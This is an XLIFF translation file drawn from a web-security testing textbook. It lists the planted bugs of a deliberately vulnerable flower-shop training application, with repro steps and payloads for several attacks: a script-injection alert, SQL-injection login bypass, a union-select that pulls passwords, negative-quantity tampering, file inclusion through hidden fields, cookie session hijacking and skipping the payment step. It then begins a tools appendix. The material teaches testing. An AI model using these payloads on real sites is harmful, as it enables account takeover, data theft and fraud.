          <source>The most obvious way of exploiting this vulnerability is to post a message that includes the following text:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;script&amp;gt;alert("hello, world")&amp;lt;/script&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>This code results in a message box containing &lt;tt&gt;hello, world&lt;/tt&gt;. However, for further exploitation, the attacker could post a script that writes an invisible element&amp;mdash;such as a 1x1 transparent GIF&amp;mdash;gathered from a remote server and passes CGI parameters that contain cookie/session information. (The server would ignore them, but they would be posted in the log file.) You can include scripting in a page in numerous places. An exhaustive list is not appropriate in this document.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>In the first case, a message box displays when a user views the page. In extended cases, the user sees nothing out of the ordinary, but information, such as session information, is leaked to a malicious user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>selectflowers.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Validation Tampering</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>To ensure that users choose appropriate input for the quantity of flowers to purchase, the Input field on this page calls a JavaScript function to validate input whenever the focus on the field is lost. Removing this validation allows an attacker to enter any value he likes into the field. The field is not rechecked when the form is posted.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Save the page to the local machine and edit the source. To remove the validation, either delete the body of the &lt;tt&gt;checkqty&lt;/tt&gt; function or the &lt;tt&gt;onBlur&lt;/tt&gt; action of the Quantity field. Finally, change the form's action to an absolute URL. Save the page and reload it into the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>You can enter any input into the field (even SQL injection is possible), but the easiest way to exploit this vulnerability is to select some flowers and enter a negative number as the quantity. Submitting the page and navigating to one that shows the cart's value (either the Flowers/Arrangements Selection page or the Checkout page) demonstrates the total as a negative amount (the cost of items multiplied by the user's input).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>A negative value appears in the cart's total, but there is also the potential for an SQL injection attack on the &lt;tt&gt;INSERT&lt;/tt&gt; statement executed on the server with the data provided from this input. (It's much harder than the negative quantity exploit.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>selectarrangements.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Validation Tampering</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>To ensure that users choose appropriate input for the quantity of arrangements to purchase, the user interface provides a drop-down menu allowing the user only to select quantities from 1 to 10. However, an attacker can modify the page and insert his own values that are not validated on the server.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Save the page to the local machine and edit the source. For one of the Select fields, modify an existing option or add a new one. Finally, change the form's action to an absolute URL. Save the page and reload it into the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Via this new option, you can now post any input (an SQL injection exploit is even possible), but the easiest way to exploit this vulnerability is to use a negative number as the quantity. Submitting the page and navigating to one that shows the cart's value (either the Flowers/Arrangements Selection page or the Checkout page) demonstrates the total as a negative amount (the cost of items multiplied by the user's input).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>A negative value appears in the cart's total as in the preceding example, but there is also the potential for an SQL injection attack on the &lt;tt&gt;INSERT&lt;/tt&gt; statement executed on the server with the data provided from this input. (That's much harder than the negative quantity exploit, though.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;tt&gt;showdetails.php&lt;/tt&gt; (called from &lt;tt&gt;selectflowers.php&lt;/tt&gt; and &lt;tt&gt;selectarrangements.php&lt;/tt&gt;)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SQL Injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>By modifying either the &lt;tt&gt;type&lt;/tt&gt; or &lt;tt&gt;id&lt;/tt&gt; CGI parameter, the attacker can change the SQL query.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Rather than modifying how the Calling page (&lt;tt&gt;selectflowers.php&lt;/tt&gt; or &lt;tt&gt;selectarrangements.php&lt;/tt&gt;) sends data to the pop-up window, go to the Show Details page directly by entering it into the main browser window with some relevant parameters (for example, &lt;tt&gt;showdetails.php?type=flowers&amp;amp;id=1&lt;/tt&gt;). Append the string &lt;tt&gt;&amp;lt;sp&amp;gt;or 1=1 --&amp;lt;sp&amp;gt;&lt;/tt&gt; to the end of the URL, and all the flowers' details will be displayed on the page. However, this information isn't very useful, so we modify the query to select information out of a database table that we shouldn't be able to access by appending the following to the original page request:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.div.pre.text">
          <source>&amp;lt;sp&amp;gt;or 1=2 union select password from users --&amp;lt;sp&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The output from the SQL query is either a list of flower/arrangement descriptions or other information from the database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>search.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Hidden Field Manipulation/Directory Traversal</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>To help the search component format the page so that it looks like part of the site, two hidden fields specify the header and footer to apply to the results. You can modify these fields to point to other files on the file system and include them in the output.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Save the page to the local machine and edit the source to set the field(s) &lt;tt&gt;h&lt;/tt&gt; and &lt;tt&gt;f&lt;/tt&gt; to point to alternative files on the server. Save the page, reload it into the browser, and perform a search. The files will be included in the output.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>On most occasions, the files that &lt;tt&gt;h&lt;/tt&gt; and &lt;tt&gt;f&lt;/tt&gt; point to will be shown in the browser window. However, sometimes the browser can't understand the output and will display nothing, even though the output is still available by viewing the source of the page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;tt&gt;saveuser.php&lt;/tt&gt; (called from &lt;tt&gt;register.php&lt;/tt&gt;)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Buffer Overflow</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>When a user forces more than 50 characters into the Card Number field on the &lt;tt&gt;Register.php&lt;/tt&gt; page and submits it to the server, the user is redirected to a Buffer Overflow page. We use a descriptive page rather than an overflow because it is difficult to achieve a real overflow in a PHP, and an actual overflow would most likely stop the server and interrupt other users' testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Save the page, remove the &lt;tt&gt;maxlength&lt;/tt&gt; attribute from the &lt;tt&gt;cardnumber&lt;/tt&gt; field, reload and post the data, or use a direct post request like in the direct request vulnerability.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The user should be redirected to the Buffer Overflow page.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>checksession.php/login.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SQL Injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>An attacker can utilize SQL injection in the Login field to allow him to log in as the first user in the database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Insert the string &lt;tt&gt;' or 1=1 --&amp;lt;sp&amp;gt;&lt;/tt&gt; into the Login field. (Leave the Password field blank.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The login/password will be accepted, and the attacker will be logged in as the first registered user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&lt;tt&gt;account.php&lt;/tt&gt; (calls &lt;tt&gt;userdetails.php&lt;/tt&gt;)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Session Hijacking</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>The sequence numbers generated for a user's cart and a token generated to &amp;quot;remember&amp;quot; them whenever they return to the site are easily guessable. Although the cart number is a temporary cookie that is stored in memory and deleted when the browser is closed, the session cookie that is used to remember users is stored in the local file system and can easily be changed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Use the Flowershop application and register a user to create the required cookie. On the local file system, open the cookie file (usually in &lt;tt&gt;c:/documents and settings/%userprofile%/cookies/%userprofile%@hackerland&lt;/tt&gt;). The second line in the file is the session value of the user. Changing this value allows a user to revisit the site and masquerade as a different user.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>If a valid session is chosen, the user will be able to use the site as another user (purchases, details, and so on). If the session is invalid, the application will ask the user to log in.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>URL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.tt.text">
          <source>delivery.php</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Type</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Forceful Browsing</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Description</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>After the user has selected the flowers and arrangements that he would like and navigated to the Checkout page (registering himself or logging in as an existing user), he can jump directly to the &lt;tt&gt;Delivery.php&lt;/tt&gt; page and bypass the payment mechanism.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Repro Steps</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Select some flowers or arrangements and proceed to the Checkout page (either with an existing user and logging in if necessary or registering first). The user can then jump directly to the Delivery page without providing payment information and with no error being raised.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Bug Output</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>A &lt;tt&gt;payment received&lt;/tt&gt; message appears and the flowers/arrangements purchased is printed.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app01lev1sec6.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Appendix C. Tools</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app02.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h2.text">
          <source>Appendix C. Tools</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>TextPad</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Nikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Wikto</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Stunnel</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>BlackWidow</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Wget</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>cURL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>Paros</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>SPIKE Proxy</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>SSLDigger</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.a.text">
          <source>The Human Brain</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app02.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec1.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>TextPad</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>TextPad</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Every hacker needs a good tool for viewing files of all types, and TextPad seems to be able to handle whatever is thrown at it with grace. Web application testing involves numerous file extensions with an array of content from script files to proprietary database formats and more.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>TextPad is the only tool I know of that will open the Paros db file in a usable manner, which is one reason I recommend it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure C-1. TextPad&amp;mdash;an alternative text editor.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>TextPad is highly configurable. It allows the user to create custom document classes to make it aware of files like Perl scripts and apply a predefined or custom syntax template so that it appropriately highlights and indents documents (like the &lt;tt&gt;Perl&lt;/tt&gt; text class). There is even a Universal Resource Locator (URL) with several free syntax definition files for download (&lt;a class="docLink" target="_blank" href="http://www.textpad.com/add-ons/syna2g.html"&gt;http://www.textpad.com/add-ons/syna2g.html&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="app03lev1sec10.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>SSLDigger</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="app03lev1sec9.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
